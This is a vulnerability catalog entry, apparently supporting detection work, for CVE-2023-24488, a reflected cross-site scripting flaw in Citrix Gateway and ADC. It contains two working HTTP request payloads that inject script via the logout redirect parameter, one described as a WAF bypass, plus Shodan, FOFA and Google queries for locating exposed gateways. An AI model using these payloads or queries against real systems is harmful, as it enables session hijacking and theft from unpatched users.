---
layout: "post"
cve_id: "CVE-2023-24488"
title: "Citrix Gateway and Citrix ADC - Cross-Site Scripting"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-24488.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-24488.yaml"
author: "johnk3r,DhiyaneshDk"
severity: "medium"
impact: "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary scripts in the context of the user's browser, potentially leading to session hijacking, defacement, or theft of sensitive information.
"
remediation: "Apply the necessary patches or updates provided by Citrix to mitigate this vulnerability.
"
reference:
  - "https://support.citrix.com/article/CTX477714/citrix-adc-and-citrix-gateway-security-bulletin-for-cve202324487-cve202324488"
  - "https://blog.assetnote.io/2023/06/29/citrix-xss-advisory/"
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-24488"
  - "https://twitter.com/infosec_au/status/1674786106381070342"
  - "https://twitter.com/bxmbn/status/1675250259608449026"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N', 'cvss-score': 6.1, 'cve-id': 'CVE-2023-24488', 'cwe-id': 'CWE-79', 'epss-score': 0.91357, 'epss-percentile': 0.99637, 'cpe': 'cpe:2.3:a:citrix:gateway:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 2, 'vendor': 'citrix', 'product': 'gateway', 'shodan-query': ['title:"Citrix Gateway"', 'http.title:"citrix gateway"'], 'fofa-query': 'title="citrix gateway"', 'google-query': 'intitle:"citrix gateway"'}"
tags:
  - "cve2023"
  - "cve"
  - "citrix"
  - "xss"
  - "adc"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Citrix ADC and Citrix Gateway versions before 13.1 and 13.1-45.61, 13.0 and 13.0-90.11, 12.1 and 12.1-65.35 contain a cross-site scripting vulnerability due to improper input validation.


## üåê HTTP Request
```nohighlight
GET /oauth/idp/logout?post_logout_redirect_uri=%0D%0A%0D%0A%3Cbody+x=%27&%27onload=%22(alert)(%27citrix+akamai+bypass%27)%22%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script> HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

